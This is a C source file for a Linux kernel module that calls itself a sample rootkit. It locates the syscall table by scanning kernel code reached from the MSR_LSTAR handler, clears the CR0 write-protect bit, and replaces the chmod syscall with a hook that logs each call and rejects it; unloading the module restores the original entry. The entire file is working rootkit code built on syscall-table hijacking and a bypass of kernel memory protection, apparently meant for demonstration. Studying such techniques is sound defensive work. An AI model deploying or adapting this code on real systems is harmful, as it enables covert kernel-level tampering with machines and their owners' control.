#include "asm/unistd_64.h"
#include "linux/linkage.h"
#include "linux/printk.h"
#include "linux/types.h"
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Krzysztof Zdulski");
MODULE_DESCRIPTION("Sample rootkit - syscall table");
MODULE_VERSION("0.01");

static void *org_syscall;
static void **syscall_table;

static inline void _write_cr0(unsigned long val)
{
    asm volatile("mov %0,%%cr0" : "+r"(val) : : "memory");
}

static inline void *get_syscall_64_handler(void)
{
    unsigned long system_call_entry;
    rdmsrl(MSR_LSTAR, system_call_entry);
    return (void *)system_call_entry;
}

#define ENTRY_DO_CALL_OFFSET 0x77

void **find_syscall_table(void)
{
    unsigned char *entry_syscall;
    unsigned char *do_syscall;
    unsigned char *addr;
    void **syscall_table = NULL;
    int offset;

    entry_syscall = get_syscall_64_handler();

    // First byte of call is the opcode, following 4 bytes are the signed offset
    offset = *((int *)(entry_syscall + ENTRY_DO_CALL_OFFSET + 1));

    // The call offset should include the 5 instruction bytes
    do_syscall = entry_syscall + offset + ENTRY_DO_CALL_OFFSET + 5;
    pr_debug("sym.do_syscall_64 is @ %px", do_syscall);

    for (addr = do_syscall; addr < do_syscall + 0xff; ++addr) {
        if (addr[0] == 0x48 && addr[1] == 0x8b && addr[2] == 0x04 &&
            addr[3] == 0xc5) {
            offset = *((int *)(addr + 4));
            // Sign extend
            syscall_table = (void **)(offset < 0 ? 0xffffffff00000000 | offset :
                                                   offset);
            break;
        }
    }

    return syscall_table;
}

asmlinkage long sys_chmod_hook(const char __user *filename, umode_t mode)
{
    printk(KERN_INFO "samples: chmod called");
    return -EPERM;
}

static int __init lkm_example_init(void)
{

    printk(KERN_INFO "loading syscall table module");

    syscall_table = find_syscall_table();
    org_syscall = syscall_table[__NR_chmod];

    _write_cr0(native_read_cr0() & (~0x10000));
    syscall_table[__NR_chmod] = sys_chmod_hook;
    _write_cr0(native_read_cr0() | 0x10000);

    return 0;
}

static void __exit lkm_example_exit(void)
{
    printk(KERN_INFO "unloading syscall table module");

    _write_cr0(native_read_cr0() & (~0x10000));
    syscall_table[__NR_chmod] = org_syscall;
    _write_cr0(native_read_cr0() | 0x10000);

}

module_init(lkm_example_init);
module_exit(lkm_example_exit);
